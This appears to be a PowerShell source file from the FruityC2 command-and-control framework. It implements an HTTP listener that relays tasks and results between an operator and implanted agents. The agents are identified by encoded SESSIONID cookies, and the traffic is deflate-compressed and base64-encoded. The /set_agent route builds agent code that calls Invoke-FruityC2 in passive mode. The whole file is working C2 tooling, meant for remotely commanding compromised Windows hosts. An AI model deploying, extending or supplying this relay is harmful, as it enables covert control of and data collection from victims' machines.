# Copyright (C) 2017 xtr4nge [_AT_] gmail.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

# REF https://gist.github.com/wagnerandrade/5424431
# REF ACCESS DENIED: http://stackoverflow.com/questions/4019466/httplistener-access-denied
# REF ACCESS DENIED: http://stackoverflow.com/questions/14962334/httplistenerexception-access-denied-for-non-admins
# PRIVS: Administrator or RUN: netsh http add urlacl url=http://+:8080/ user=Everyone listen=yes

function webserver($port) {
    #try {
        $cmd_output = ""
        [bool]$opt_b64 = $false
        [bool]$opt_enc = $false
        [bool]$opt_comp = $true

        # STORE LINKED AGENTS
        [String]$agent_code = ""
        $agents = @{}
        $task = @{}

        function linked() {
            $_c = ""
            foreach ($key in $agents.Keys) {
                $_c += "$($agents[$key])|"
            }
            if ($_c.Length -gt 0) {
                return $_c.Substring(0,$_c.Length-1)
            } else {
                return ""
            }
        }

        # COMPRESS DATA
        function deflate($data) {
            $s = $data
            $ms = New-Object System.IO.MemoryStream
            $cs = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Compress)
            $sw = New-Object System.IO.StreamWriter($cs)
            $sw.Write($s)
    
            $sw.Close();
            $s = [System.Convert]::ToBase64String($ms.ToArray())
            # BASE64 URLSAFE
            $s = $s.replace("+","-")
            $s = $s.replace("/","_")
            return $s
        }

        # DECOMPRESS DATA
        function inflate($data) {
            # BASE64 URLSAFE
            $data = $data.replace("-","+")
            $data = $data.replace("_","/")
            $data = [System.Convert]::FromBase64String($data)
            $ms = New-Object System.IO.MemoryStream
            $ms.Write($data, 0, $data.Length)
            $ms.Seek(0,0) | Out-Null
            $sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress))
            return $sr.ReadToEnd()
        }

        Function rx_data($data) {
            #if ($option_compression -eq $true) { $data = inflate($data) }
            #if ($option_encryption -eq $true) { $data = decrypt($data) }
            if ($opt_comp) { $data = inflate($data) }
            if ($opt_enc) { $data = decrypt($data) }
            return $data
        }

        Function tx_data($data) {
            #if ($option_encryption -eq $true) { $data = encrypt($data) }
            #if ($option_compression -eq $true) { $data = deflate($data) }
            if ($opt_encr) { $data = encrypt($data) }
            if ($opt_comp) { $data = deflate($data) }

            #if ($option_base64 -eq $true) { $data = b64encoder($data) }
            return $data
        }

        Function validate_agent {
            param(
                [String]$SESSION = ""
            )
                    
            try {
                $data_raw = rx_data($SESSION)
                $data = $data_raw.split("|")

                if ($data.Length -ne 8) { 
                    return [Bool]$False
                } else {
                    return [Bool]$True
                }
            } catch {
                return $False
            }
        }

        $routes = @{
            "/data" = { return "store" };
            "/set_task" = { return "set_task"};
            "/get_task" = { return "get_task"};
            "/set_result" = { return "set_result"};
            "/get_result" = { return "get_result"};
            "/linked" = { return linked};
            "/set_agent" = { return "loaded ;)" };
            "/get_agent" = { return $agent_code };
            "/reset" = { return "done ;)" };
            "/kill" = { return "bye ;)" }
        }

        $url = "http://+:$port/"
        $listener = New-Object System.Net.HttpListener
        $listener.Prefixes.Add($url)
        $listener.Start()

        Write-Host "Listening at $url..."

        while ($listener.IsListening)
        {
            try {
                $context = $listener.GetContext()
                $requestUrl = $context.Request.Url
                $response = $context.Response
                
                # REF: http://masterrex.com/?p=85
                $out = ""
                if ($context.Request.HasEntityBody -eq $true) {
                    $StreamReader = New-Object System.IO.StreamReader $context.Request.InputStream
                    $out = $StreamReader.ReadToEnd()
                    #$out
                    $StreamReader.Close()
                }

                $raw_url = $context.Request.RawUrl

                Write-Host ''
                Write-Host "> $requestUrl"

                $localPath = $requestUrl.LocalPath
                $route = $routes.Get_Item($requestUrl.LocalPath)

                $data_out = ""

                # [POST] SET_TASK: STORE DATA FROM WEBPIPE ON LOCAL_FILE
                if ($raw_url.StartsWith("/set_task")) {
                    $data_target = $context.Request.Cookies["SESSIONID"].Value
                    $valid = validate_agent -SESSION $data_target

                    # VALIDATE IF SOURCE IS ALLOWED
                    if ($valid -and $data_target.Length -gt 1) { 
                        $data_task = $out

                        $target = rx_data($data_target)
                        $agent = $target.split("|")[0]

                        $data = rx_data($data_task)
                        $data = tx_data("$data|100")

                        # WRITE DATA
                        # DATA IN COLLECTION
                        $task[$agent] = @("$data","")
                    }
                }

                # [GET] GET_TASK: READ DATA FROM LOCAL_FILE
                if ($raw_url.StartsWith("/get_task")) {
                    $data_target = $context.Request.Cookies["SESSIONID"].Value
                    $valid = validate_agent -SESSION $data_target

                    # VALIDATE IF SOURCE IS ALLOWED
                    if ($valid -and $data_target.Length -gt 1) { 

                        $target = rx_data($data_target)
                        $agent = $target.split("|")[0]

                        $agents[$agent] = $data_target

                        if ($task.Contains($agent)) {
                            # READ DATA
                            try {
                                # DATA IN COLLECTION
                                $data_out = $task[$agent][0]
                            } catch {
                                # DATA IN COLLECTION
                                $task[$agent] = @("$data_out","")
                            }
                    
                            # RESET TASK
                            $temp = tx_data("?|0")
                            $temp = ""
                            $task[$agent] = @("$temp","")
                        }
                    } else {
                        $route = $null
                    }

                }

                # [POST] SET_RESULT: STORE DATA FROM WEBPIPE ON LOCAL_FILE
                if ($raw_url.StartsWith("/set_result")) {
                    $data_target = $context.Request.Cookies["SESSIONID"].Value
                    $valid = validate_agent -SESSION $data_target

                    # VALIDATE IF SOURCE IS ALLOWED
                    if ($valid -and $data_target.Length -gt 1) { 
                        $data_task = $out.Replace("send=","")
                        
                        $target = rx_data($data_target)                    
                        $data = rx_data($data_task)                    
                        $agent = $target.split("|")[0]

                        # WRITE DATA
                        # DATA IN COLLECTION
                        $task[$agent] = @("","$data_target|$data_task")
                     } else {
                        $route = $null
                    }
                }

                # [GET] GET_RESULT: READ DATA FROM LOCAL_FILE
                if ($raw_url.StartsWith("/get_result")) {
                    $data_target = $context.Request.Cookies["SESSIONID"].Value
                    $valid = validate_agent -SESSION $data_target
                    
                    # VALIDATE IF SOURCE IS ALLOWED
                    if ($valid -and $data_target.Length -gt 1) { 
                        $target = rx_data($data_target)
                        $agent = $target.split("|")[0]

                        if ($task.Contains($agent)) {                        
                            # READ DATA
                            # DATA IN COLLECTION
                            $data_out = $task[$agent][1]
                        
                            # CLEAN RESULT FILE
                            $task[$agent][1] = ""
                        }
                    } else {
                        $route = $null
                    }
                    
                }

                # [POST] SET_AGENT
                if ($raw_url.StartsWith("/set_agent")) {
                    $data_target = $context.Request.Cookies["SESSIONID"].Value
                    $valid = validate_agent -SESSION $data_target

                    Write-Host $data_target

                    # VALIDATE IF SOURCE IS ALLOWED
                    if ($valid -and $data_target.Length -gt 1) {
                        $target = rx_data($data_target)

                        $data_task = $out

                        $_get = "/get_task"
                        $_post = "/set_result"
                        #$UA = "_"
                        #$r_server = "localhost"
                        $_server = ((Test-Connection $env:COMPUTERNAME -count 1 | select Ipv4Address) | FT -HideTableHeaders |  Out-String).Trim()
                        $_port = $port                        
                        #$TARGET
                        $post_id = "send"
                        #$session_id = "SESSIONID"

                        $agent_code = rx_data($data_task)
                        $agent_code += " ; Invoke-FruityC2 -path_get '$_get' -path_post '$_post' -stager `$false -r_server '$_server' -r_port '$_port' -post_id '$post_id' -mode 'passive'"
                    } else {
                        $route = $null
                    }

                }

                if ($raw_url.StartsWith("/reset")) { 
                    $agents = @{}
                }

                # RESPONSE
                if ($route -eq $null)
                {
                    $response.StatusCode = 404
                }
                else
                {
                    
                    if (!$data_out) {
                        $content = & $route
                    } else {
                        $content = $data_out
                    }

                    $buffer = [System.Text.Encoding]::UTF8.GetBytes($content)
                    $response.ContentLength64 = $buffer.Length
                    $response.OutputStream.Write($buffer, 0, $buffer.Length)
                }
    
                $response.Close()

                $responseStatus = $response.StatusCode
                Write-Host "< $responseStatus"

                # KILL
                if ($raw_url -eq "/kill") { 
                    $listener.Stop()
                    break;
                }
            }
            catch
            {
                $listener.Stop();
            }
        }
}
webserver(**port**)
